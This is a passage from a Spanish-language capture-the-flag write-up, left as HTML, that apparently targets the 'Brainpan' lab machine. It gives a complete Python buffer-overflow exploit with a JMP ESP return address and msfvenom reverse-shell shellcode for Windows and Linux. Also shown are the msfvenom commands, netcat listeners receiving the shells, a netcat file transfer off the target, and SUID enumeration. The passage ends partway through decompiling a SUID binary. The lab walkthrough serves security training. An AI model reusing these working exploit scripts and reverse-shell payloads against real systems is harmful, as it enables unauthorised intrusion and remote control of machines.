shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb9\x04\x76\x8e\x40\xcf\xb9\xe7\x2e\x5a\x52</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfa\xae\x65\x19\x73\x48\x0f\x4d\xd2\xc3\xb8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf4\x7f\x9f\x59\xf8\x55\xda\x5a\x72\x5a\x1b</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x14\x73\x17\x0f\xc1\x73\x62\x6d\x44\x8b\x58</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x19\x0a\x1e\x07\xd9\x45\x03\x90\x8e\x02\xf5</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe9\x5a\xbf\xac\x43\x78\x42\x28\xab\x38\x99</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x89\x32\xc1\x6c\xb5\x10\xd1\xa8\x36\x1d\x85</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x64\x61\xcb\x73\xc3\xdb\xbd\x2d\x9d\xb0\x17</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb9\x58\xfb\xa7\xbf\x64\xd6\x51\x5f\xd4\x8f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x27\x60\xd9\x47\xa0\x19\x07\xf8\x4f\xf0\x83</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x18\xb2\xd0\xf9\xb0\x6b\xb1\x43\xdd\x8b\x6c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x87\xd8\x0f\x84\x78\x1f\x0f\xed\x7d\x5b\x97</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\x0c\xf4\x72\x20\xa3\xf5\x56\x20\x43\x0a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x59</span><span class="s">"</span><span class="p">

shell </span><span class="o">=</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">shellcode

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora al ejecutar este script nos llegua la <code class="language-plaintext highlighter-rouge">shell</code> sin ningun problema como antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443 
Listening on 0.0.0.0 443
Connection received on 192.168.100.5
Microsoft Windows [Versión 10.0.23430.1000]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Windows\System32></span><span class="am">whoami</span><span class="p">
gatogamer1155\pc1

C:\Windows\System32></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-puck">
<br><h3 class="post-title">Shell - puck</h3><br>

<p class="plain-text">Ahora que funciona es simplemente crear un nuevo shellcode para la interfaz <code class="language-plaintext highlighter-rouge">tun0</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp -a x86 LHOST=10.8.64.87 LPORT=443 EXITFUNC=thread -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1990 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\x8c\x20\xca\x92\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x70\xc8\x48\x92\x88\x09\x2d\x1a"
shellcode += b"\x6d\x38\x6d\x78\xe6\x6b\x5d\x0a\xaa\x87\x16"
shellcode += b"\x5e\x5e\x13\x5a\x77\x51\x94\xd1\xa1\x5c\x25"
shellcode += b"\x49\x91\xff\xa5\x90\xc6\xdf\x94\x5a\x1b\x1e"
shellcode += b"\xd0\x87\xd6\x72\x89\xcc\x45\x62\xbe\x99\x55"
shellcode += b"\x09\x8c\x0c\xde\xee\x45\x2e\xcf\xa1\xde\x69"
shellcode += b"\xcf\x40\x32\x02\x46\x5a\x57\x2f\x10\xd1\xa3"
shellcode += b"\xdb\xa3\x33\xfa\x24\x0f\x7a\x32\xd7\x51\xbb"
shellcode += b"\xf5\x08\x24\xb5\x05\xb4\x3f\x02\x77\x62\xb5"
shellcode += b"\x90\xdf\xe1\x6d\x7c\xe1\x26\xeb\xf7\xed\x83"
shellcode += b"\x7f\x5f\xf2\x12\x53\xd4\x0e\x9e\x52\x3a\x87"
shellcode += b"\xe4\x70\x9e\xc3\xbf\x19\x87\xa9\x6e\x25\xd7"
shellcode += b"\x11\xce\x83\x9c\xbc\x1b\xbe\xff\xa8\xe8\xf3"
shellcode += b"\xff\x28\x67\x83\x8c\x1a\x28\x3f\x1a\x17\xa1"
shellcode += b"\x99\xdd\x58\x98\x5e\x71\xa7\x23\x9f\x58\x6c"
shellcode += b"\x77\xcf\xf2\x45\xf8\x84\x02\x69\x2d\x0a\x52"
shellcode += b"\xc5\x9e\xeb\x02\xa5\x4e\x84\x48\x2a\xb0\xb4"
shellcode += b"\x73\xe0\xd9\x5f\x8e\x63\xec\x97\xd0\x24\x98"
shellcode += b"\xa5\xd0\xcb\xe3\x23\x36\xa1\x03\x62\xe1\x5e"
shellcode += b"\xbd\x2f\x79\xfe\x42\xfa\x04\xc0\xc9\x09\xf9"
shellcode += b"\x8f\x39\x67\xe9\x78\xca\x32\x53\x2e\xd5\xe8"
shellcode += b"\xfb\xac\x44\x77\xfb\xbb\x74\x20\xac\xec\x4b"
shellcode += b"\x39\x38\x01\xf5\x93\x5e\xd8\x63\xdb\xda\x07"
shellcode += b"\x50\xe2\xe3\xca\xec\xc0\xf3\x12\xec\x4c\xa7"
shellcode += b"\xca\xbb\x1a\x11\xad\x15\xed\xcb\x67\xc9\xa7"
shellcode += b"\x9b\xfe\x21\x78\xdd\xfe\x6f\x0e\x01\x4e\xc6"
shellcode += b"\x57\x3e\x7f\x8e\x5f\x47\x9d\x2e\x9f\x92\x25"
shellcode += b"\x4e\x42\x36\x50\xe7\xdb\xd3\xd9\x6a\xdc\x0e"
shellcode += b"\x1d\x93\x5f\xba\xde\x60\x7f\xcf\xdb\x2d\xc7"
shellcode += b"\x3c\x96\x3e\xa2\x42\x05\x3e\xe7\x42\xa9\xc0"
shellcode += b"\x08"</span>
</code></pre></div></div><br>

<p class="plain-text">Simplemente cambiamos el <code class="language-plaintext highlighter-rouge">shellcode</code> y la dirección de el apartado de <code class="language-plaintext highlighter-rouge">remote</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="p">524
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf3\x12\x17\x31</span><span class="s">"</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x8c\x20\xca\x92\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x70\xc8\x48\x92\x88\x09\x2d\x1a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6d\x38\x6d\x78\xe6\x6b\x5d\x0a\xaa\x87\x16</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5e\x5e\x13\x5a\x77\x51\x94\xd1\xa1\x5c\x25</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x49\x91\xff\xa5\x90\xc6\xdf\x94\x5a\x1b\x1e</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd0\x87\xd6\x72\x89\xcc\x45\x62\xbe\x99\x55</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x09\x8c\x0c\xde\xee\x45\x2e\xcf\xa1\xde\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xcf\x40\x32\x02\x46\x5a\x57\x2f\x10\xd1\xa3</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xdb\xa3\x33\xfa\x24\x0f\x7a\x32\xd7\x51\xbb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf5\x08\x24\xb5\x05\xb4\x3f\x02\x77\x62\xb5</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x90\xdf\xe1\x6d\x7c\xe1\x26\xeb\xf7\xed\x83</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x7f\x5f\xf2\x12\x53\xd4\x0e\x9e\x52\x3a\x87</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe4\x70\x9e\xc3\xbf\x19\x87\xa9\x6e\x25\xd7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x11\xce\x83\x9c\xbc\x1b\xbe\xff\xa8\xe8\xf3</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\x28\x67\x83\x8c\x1a\x28\x3f\x1a\x17\xa1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x99\xdd\x58\x98\x5e\x71\xa7\x23\x9f\x58\x6c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x77\xcf\xf2\x45\xf8\x84\x02\x69\x2d\x0a\x52</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc5\x9e\xeb\x02\xa5\x4e\x84\x48\x2a\xb0\xb4</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x73\xe0\xd9\x5f\x8e\x63\xec\x97\xd0\x24\x98</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa5\xd0\xcb\xe3\x23\x36\xa1\x03\x62\xe1\x5e</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbd\x2f\x79\xfe\x42\xfa\x04\xc0\xc9\x09\xf9</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8f\x39\x67\xe9\x78\xca\x32\x53\x2e\xd5\xe8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\xac\x44\x77\xfb\xbb\x74\x20\xac\xec\x4b</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x39\x38\x01\xf5\x93\x5e\xd8\x63\xdb\xda\x07</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x50\xe2\xe3\xca\xec\xc0\xf3\x12\xec\x4c\xa7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xca\xbb\x1a\x11\xad\x15\xed\xcb\x67\xc9\xa7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x9b\xfe\x21\x78\xdd\xfe\x6f\x0e\x01\x4e\xc6</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x57\x3e\x7f\x8e\x5f\x47\x9d\x2e\x9f\x92\x25</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4e\x42\x36\x50\xe7\xdb\xd3\xd9\x6a\xdc\x0e</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1d\x93\x5f\xba\xde\x60\x7f\xcf\xdb\x2d\xc7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3c\x96\x3e\xa2\x42\x05\x3e\xe7\x42\xa9\xc0</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x08</span><span class="s">"</span><span class="p">  

shell </span><span class="o">=</span><span class="p"> remote(</span><span class="s">"10.10.27.47"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">shellcode

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Corremos el exploit y recibimos una <code class="language-plaintext highlighter-rouge">shell</code> de la máquina victima en la unidad <code class="language-plaintext highlighter-rouge">Z:</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.27.47 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.27.47 port 9999</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.27.47  
CMD Version 1.4.1

Z:\home\puck></span><span class="am">whoami</span><span class="p">
File not found.

Z:\home\puck></span>
</code></pre></div></div><br>

<p class="plain-text">No podemos hacer un simple <code class="language-plaintext highlighter-rouge">whoami</code>, sin embargo al mirar los directorios en la <code class="language-plaintext highlighter-rouge">raiz</code> podemos ver que la estructura de directorios es de un <code class="language-plaintext highlighter-rouge">Linux</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Z:\home\puck></span><span class="am">dir</span><span class="p"> Z:\
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:

  3/4/2013   1:02 PM  &ltDIR>         bin
  3/4/2013  11:19 AM  &ltDIR>         boot
  4/7/2023  11:09 PM  &ltDIR>         etc
  3/4/2013  11:49 AM  &ltDIR>         home
  3/4/2013  11:18 AM    15,084,717  initrd.img
  3/4/2013  11:18 AM    15,084,717  initrd.img.old
  3/4/2013   1:04 PM  &ltDIR>         lib
  3/4/2013  10:12 AM  &ltDIR>         lost+found
  3/4/2013  10:12 AM  &ltDIR>         media
 10/9/2012   9:59 AM  &ltDIR>         mnt
  3/4/2013  10:13 AM  &ltDIR>         opt
  3/7/2013  11:07 PM  &ltDIR>         root
  4/7/2023  11:09 PM  &ltDIR>         run
  3/4/2013  11:20 AM  &ltDIR>         sbin
 6/11/2012   9:43 AM  &ltDIR>         selinux
  3/4/2013  10:13 AM  &ltDIR>         srv
  4/8/2023  12:29 AM  &ltDIR>         tmp
  3/4/2013  10:13 AM  &ltDIR>         usr
  8/5/2019   3:47 PM  &ltDIR>         var
 2/25/2013   2:32 PM     5,180,432  vmlinuz
 2/25/2013   2:32 PM     5,180,432  vmlinuz.old
       4 files               40,530,298 bytes
      17 directories     13,849,333,760 bytes free  

Z:\home\puck></span>
</code></pre></div></div><br>

<p class="plain-text">Basta con ejecutar la ruta absoluta del binario <code class="language-plaintext highlighter-rouge">sh</code> para obtener una shell de <code class="language-plaintext highlighter-rouge">Linux</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Z:\home\puck></span><span class="am">/bin/sh</span><span class="p">
sh: turning off NDELAY mode

script /dev/null -c bash
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=1002(puck) gid=1002(puck) groups=1002(puck)  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
10.10.27.47 
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Otra forma es cambiando el payload <code class="language-plaintext highlighter-rouge">msfvenom</code> a uno de linux x86 para recibir una sh</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p linux/x86/shell_reverse_tcp -a x86 LHOST=10.8.64.87 LPORT=443 EXITFUNC=thread EXITFUNC=thread -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 97 (iteration=0)
x86/jmp_call_additive chosen with final size 97
Payload size: 97 bytes
Final size of python file: 558 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\x0d\x3f\x97\x67\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x3c\xe4\x60\x84\x6d\x59\xdc\x21"
shellcode += b"\x93\xd4\x03\x05\xf5\x2b\x43\xf5\xa0\x03\x7b"
shellcode += b"\x37\xd2\x2d\xfd\x3e\xba\xa7\xf5\x80\x6d\xd0"
shellcode += b"\x07\x01\x90\x9b\x81\xe0\x22\xbd\xc1\xb3\x11"
shellcode += b"\xf1\xe1\xba\x74\x38\x65\xee\x1e\xad\x49\x7c"
shellcode += b"\xb6\x59\xb9\xad\x24\xf3\x4c\x52\xfa\x50\xc6"  
shellcode += b"\x74\x4a\x5d\x15\xf6\xaa\x62\xa5\xf7"</span>
</code></pre></div></div><br>

<p class="plain-text">Modificamos el script, lo ejecutamos y recibimos directamente una sh de Linux</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="p">524
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf3\x12\x17\x31</span><span class="s">"</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x0d\x3f\x97\x67\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x3c\xe4\x60\x84\x6d\x59\xdc\x21</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x93\xd4\x03\x05\xf5\x2b\x43\xf5\xa0\x03\x7b</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x37\xd2\x2d\xfd\x3e\xba\xa7\xf5\x80\x6d\xd0</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x07\x01\x90\x9b\x81\xe0\x22\xbd\xc1\xb3\x11</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf1\xe1\xba\x74\x38\x65\xee\x1e\xad\x49\x7c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb6\x59\xb9\xad\x24\xf3\x4c\x52\xfa\x50\xc6</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x74\x4a\x5d\x15\xf6\xaa\x62\xa5\xf7</span><span class="s">"</span><span class="p">

shell </span><span class="o">=</span><span class="p"> remote(</span><span class="s">"10.10.27.47"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">shellcode

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.27.47 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.27.47 port 9999</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.27.47  
script /dev/null -c bash
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=1002(puck) gid=1002(puck) groups=1002(puck)  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
10.10.27.47
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>
</section>

<section class="post" id="shell-anansi">
<br><h3 class="post-title">Shell - anansi</h3><br>

<p class="plain-text">Buscando archivos <code class="language-plaintext highlighter-rouge">suid</code> hay uno que sobresale, un binario personalizado <code class="language-plaintext highlighter-rouge">validate</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -4000 2>/dev/null  
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping6
/bin/ping
/usr/bin/sudo
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/lppasswd
/usr/bin/passwd
/usr/bin/gpasswd
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/local/bin/validate
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">El binario pertenece al usuario <code class="language-plaintext highlighter-rouge">anansi</code> y tiene el privilegio <code class="language-plaintext highlighter-rouge">suid</code> en los permisos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/local/bin/validate
-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 </span><span class="err">/usr/local/bin/validate</span><span class="p">  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutarlo nos pide un <code class="language-plaintext highlighter-rouge">input</code>, asi que le pasamos <code class="language-plaintext highlighter-rouge">test</code> como input aunque realmente no queda muy claro que es lo que hace con el, solo devuelve un <code class="language-plaintext highlighter-rouge">mensaje</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate
usage validate &ltinput>
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate test  
validating input...passed.
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos descargar el <code class="language-plaintext highlighter-rouge">binario</code> en nuestra máquina para analizarlo usando <code class="language-plaintext highlighter-rouge">netcat</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 10.8.64.87 4444 < /usr/local/bin/validate  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat</span><span class="p"> -lvnp 4444 > validate  
Listening on 0.0.0.0 4444
Connection received on 10.10.27.47  </span>
</code></pre></div></div><br>

<p class="plain-text">Lo abrimos con <code class="language-plaintext highlighter-rouge">ghidra</code> y podemos ver la función <code class="language-plaintext highlighter-rouge">main</code> y todo su codigo base en <code class="language-plaintext highlighter-rouge">c</code></p>
<a href="/thm/brainpan/15.png" target="_blank"><div><p><img src="/thm/brainpan/15.png"></p></div></a>

<p class="plain-text">La función valida que este recibiendo un argumento y lo realmente destacable que hace es llamar a la función <code class="language-plaintext highlighter-rouge">validate</code> pasandole el primer <code class="language-plaintext highlighter-rouge">argumento</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">,</span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">)

{
  </span><span class="no">char </span><span class="o">*</span><span class="p">pcVar1;
  </span><span class="no">char </span><span class="o">*</span><span class="p">s;

  </span><span class="o">if</span><span class="p"> (argc </span><span class="o">< </span><span class="mi">2</span><span class="p">) {
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"usage </span><span class="mi">%s</span><span class="s"> &ltinput></span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="o">*</span><span class="p">argv);  
  }
  </span><span class="o">else</span><span class="p"> {
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"validating input..."</span><span class="p">);
    pcVar1 </span><span class="o">= </span><span class="p">validate(argv[</span><span class="mi">1</span><span class="p">]);
    </span><span class="o">if</span><span class="p"> (pcVar1 </span><span class="o">!=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="mi">0x0</span><span class="p">) {
      </span><span class="no">puts</span><span class="p">(</span><span class="s">"passed."</span><span class="p">);
    }
  }
  </span><span class="o">return </span><span class="mi">0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">En el codigo de la función <code class="language-plaintext highlighter-rouge">validate</code> tenemos <code class="language-plaintext highlighter-rouge">2</code> cosas bastante interesantes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">char </span><span class="o">* </span><span class="na">validate</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">s</span><span class="p">)

{
  </span><span class="na">size_t </span><span class="p">sVar1;
  </span><span class="no">char </span><span class="p">buf [</span><span class="mi">100</span><span class="p">];
  </span><span class="no">int </span><span class="p">i;

